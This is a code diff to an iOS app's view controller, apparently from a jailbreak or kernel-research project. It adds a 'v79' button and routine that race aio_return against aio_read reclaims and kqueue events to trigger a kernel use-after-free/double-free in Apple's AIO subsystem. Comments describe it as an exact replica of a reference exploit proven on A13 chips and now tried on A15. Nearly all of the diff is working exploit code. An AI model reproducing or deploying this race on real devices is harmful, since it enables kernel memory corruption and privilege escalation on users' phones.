@@ -210,6 +210,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *deepProbeButton;
 @property (nonatomic, strong) UIButton   *lifecycleButton;
 @property (nonatomic, strong) UIButton   *aioUafButton;
+@property (nonatomic, strong) UIButton   *v79Button;
 @property (nonatomic, strong) UIButton   *pfRouteProbeButton;
 @property (nonatomic, assign) int         pfRoutePhase;
 @property (nonatomic, strong) UIButton   *iohidUAFButton;
@@ -382,6 +383,19 @@ struct aio_race_state {
 // close(kq) → filt_aiodetach → refcount 0 → entry freed safely.
 
 #define V63_NRECLAIM 7
+
+// v79: EXACT crazymind90 reference replication for A15 diagnostics.
+// Goal: Does the proven A13 exploit work on A15, or is FAR=0x58 a chip difference?
+#define V79_NRECLAIM 8
+
+struct v79_race_state {
+    atomic_bool start, stop;
+    atomic_int freed;
+    atomic_bool reclaim_done;
+    struct aiocb *trigger;
+    struct aiocb *rcbs;
+    int nrcbs;
+};
 
 struct v63_race_state {
     atomic_bool start, stop;
@@ -635,6 +649,28 @@ static void *v78_exploit_thread(void *arg) {
     return NULL;
 }
 
+// v79 racer: EXACT crazymind90 reference racer.
+// Spins aio_return on trigger, then aio_read on ALL reclaim entries.
+// No SIGEV_KEVENT, no batching, no priming — minimal and proven on A13.
+static void *v79_racer(void *arg) {
+    struct v79_race_state *s = (struct v79_race_state *)arg;
+    aio_set_thread_affinity(42);
+    while (!atomic_load_explicit(&s->start, memory_order_acquire));
+    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
+        if (aio_error(s->trigger) == 0) {
+            ssize_t r = aio_return(s->trigger);
+            if (r >= 0) {
+                atomic_fetch_add(&s->freed, 1);
+                for (int i = 0; i < s->nrcbs; i++)
+                    aio_read(&s->rcbs[i]);
+                atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
+                return NULL;
+            }
+        }
+    }
+    return NULL;
+}
+
 // v19: Racer that frees E2's slot via aio_return then immediately reclaims
 // the same slot with an OOL message (mach_msg PHYSICAL_COPY → kalloc.256).
 // Same CPU-affinity LIFO mechanism as Phase A, but OOL data replaces AIO entry data.
@@ -705,6 +741,15 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
+    self.v79Button = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.v79Button.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *v79Conf = [UIButtonConfiguration filledButtonConfiguration];
+    v79Conf.baseBackgroundColor = [UIColor colorWithRed:0.9 green:0.45 blue:0.0 alpha:1.0];
+    self.v79Button.configuration = v79Conf;
+    [self.v79Button setTitle:@"AIO v79 (REF exact)" forState:UIControlStateNormal];
+    [self.v79Button addTarget:self action:@selector(aioUafV79Tapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.v79Button];
+
     self.pfRouteProbeButton = [UIButton buttonWithType:UIButtonTypeSystem];
     self.pfRouteProbeButton.translatesAutoresizingMaskIntoConstraints = NO;
     UIButtonConfiguration *pfConf = [UIButtonConfiguration filledButtonConfiguration];
@@ -767,7 +812,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.aioUafButton.topAnchor constraintEqualToAnchor:self.lifecycleButton.bottomAnchor constant:12],
         [self.aioUafButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.aioUafButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.pfRouteProbeButton.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:12],
+        [self.v79Button.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:12],
+        [self.v79Button.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.v79Button.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.pfRouteProbeButton.topAnchor constraintEqualToAnchor:self.v79Button.bottomAnchor constant:12],
         [self.pfRouteProbeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.pfRouteProbeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
         [self.iohidUAFButton.topAnchor constraintEqualToAnchor:self.pfRouteProbeButton.bottomAnchor constant:12],
@@ -6650,6 +6698,166 @@ cleanup:
             });
         }  // @autoreleasepool
     });  // dispatch_async
+}
+
+// v79: EXACT crazymind90 reference replica for A15 diagnostics.
+// 4096-byte file, 8 reclaim (SIGEV_NONE), no priming, simple racer.
+// Answer: does A13-proven reference code work on A15 or crash FAR=0x58?
+- (void)aioUafV79Tapped {
+    static volatile int32_t _v79Running = 0;
+    if (!__sync_bool_compare_and_swap(&_v79Running, 0, 1)) {
+        [self appendLog:@"v79 already running"];
+        return;
+    }
+    @synchronized([ViewController class]) {
+        static int64_t _v79Last = 0;
+        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
+        if (now - _v79Last < 3000) { _v79Running = 0; [self appendLog:@"Debounced"]; return; }
+        _v79Last = now;
+    }
+
+    [self appendLog:@"\n========== AIO UAF v79 (REF exact — crazymind90 replica) =========="];
+    [self appendLog:@"4096-byte file, 8 reclaim, no priming, all SIGEV_NONE"];
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.v79Button.enabled = NO;
+        [self.v79Button setTitle:@"Running..." forState:UIControlStateNormal];
+    });
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+        aio_set_thread_affinity(42);
+
+        NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v79.bin"];
+        int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
+        if (fd < 0) {
+            [self appendLog:@"FAIL: open failed"];
+            _v79Running = 0;
+            dispatch_async(dispatch_get_main_queue(), ^{
+                self.v79Button.enabled = YES;
+                [self.v79Button setTitle:@"AIO v79 (REF exact)" forState:UIControlStateNormal];
+            });
+            return;
+        }
+        char fdata[4096];
+        memset(fdata, 'A', sizeof(fdata));
+        write(fd, fdata, sizeof(fdata));
+        [self appendLog:[NSString stringWithFormat:@"fd=%d (4096 bytes) pid=%d uid=%d", fd, getpid(), getuid()]];
+
+        static struct aiocb rcbs[V79_NRECLAIM];
+        static char rbufs[V79_NRECLAIM][4096];
+
+        bool won = false;
+        for (int attempt = 0; attempt < 10; attempt++) {
+            [self appendLog:[NSString stringWithFormat:@"  attempt %d/10", attempt + 1]];
+
+            int kq = kqueue();
+            if (kq < 0) { [self appendLog:@"  kqueue failed"]; continue; }
+
+            static struct aiocb tcb;
+            static char tbuf[4096];
+            memset(&tcb, 0, sizeof(tcb));
+            tcb.aio_fildes = fd;
+            tcb.aio_buf = tbuf;
+            tcb.aio_nbytes = sizeof(tbuf);
+            tcb.aio_offset = 0;
+            tcb.aio_lio_opcode = LIO_READ;
+            tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+            tcb.aio_sigevent.sigev_signo = kq;
+            tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;
+
+            for (int i = 0; i < V79_NRECLAIM; i++) {
+                memset(&rcbs[i], 0, sizeof(rcbs[i]));
+                rcbs[i].aio_fildes = fd;
+                rcbs[i].aio_buf = rbufs[i];
+                rcbs[i].aio_nbytes = sizeof(rbufs[i]);
+                rcbs[i].aio_offset = 0;
+                rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+            }
+
+            struct v79_race_state rs = {};
+            rs.trigger = &tcb;
+            rs.rcbs = rcbs;
+            rs.nrcbs = V79_NRECLAIM;
+
+            pthread_t thr;
+            pthread_create(&thr, NULL, v79_racer, &rs);
+            atomic_store_explicit(&rs.start, true, memory_order_release);
+
+            struct aiocb *ptr = &tcb;
+            struct sigevent sig = {};
+            sig.sigev_notify = SIGEV_NONE;
+            lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
+
+            usleep(500);
+            atomic_store_explicit(&rs.stop, true, memory_order_release);
+            pthread_join(thr, NULL);
+
+            int freed = atomic_load(&rs.freed);
+            bool reclaimed = atomic_load(&rs.reclaim_done);
+            [self appendLog:[NSString stringWithFormat:@"  freed=%d reclaimed=%d", freed, reclaimed]];
+
+            if (freed == 0) {
+                while (aio_error(&tcb) == EINPROGRESS) usleep(500);
+                aio_return(&tcb);
+                close(kq);
+                [self appendLog:@"  race lost, retry"];
+                continue;
+            }
+            if (!reclaimed) {
+                close(kq);
+                [self appendLog:@"  freed but no reclaim, retry"];
+                continue;
+            }
+
+            for (int i = 0; i < V79_NRECLAIM; i++)
+                while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
+
+            struct kevent64_s kev = {};
+            struct timespec ts = {10, 0};
+            int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
+
+            if (nev > 0) {
+                [self appendLog:@"  *** DOUBLE-FREE ACHIEVED (v79 REF) ***"];
+                [self appendLog:[NSString stringWithFormat:@"  ident=0x%llx data=0x%llx udata=0x%llx",
+                    kev.ident, kev.data, kev.udata]];
+                [self appendLog:[NSString stringWithFormat:@"  ext[0]=0x%llx (errorval) ext[1]=0x%llx (returnval)",
+                    kev.ext[0], kev.ext[1]]];
+                for (int i = 0; i < V79_NRECLAIM; i++) {
+                    if (aio_error(&rcbs[i]) != EINVAL)
+                        aio_return(&rcbs[i]);
+                }
+                close(kq);
+                won = true;
+                break;
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d)", nev]];
+                for (int i = 0; i < V79_NRECLAIM; i++) {
+                    if (aio_error(&rcbs[i]) != EINVAL)
+                        aio_return(&rcbs[i]);
+                }
+            }
+            close(kq);
+        }
+
+        close(fd);
+        unlink(path.UTF8String);
+
+        if (won) {
+            [self appendLog:@"\n>>> v79 DIAGNOSIS: Reference code WORKS on A15 — our changes broke it <<<"];
+        } else {
+            [self appendLog:@"\n>>> v79 DIAGNOSIS: Reference code FAILED on A15 — chip/OS difference, NOT our bug <<<"];
+        }
+        [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
+        [self appendLog:@"========== AIO UAF v79 Complete =========="];
+
+        _v79Running = 0;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.v79Button.enabled = YES;
+            [self.v79Button setTitle:@"AIO v79 (REF exact)" forState:UIControlStateNormal];
+        });
+        }  // @autoreleasepool
+    });
 }
 
 // =======================================================================
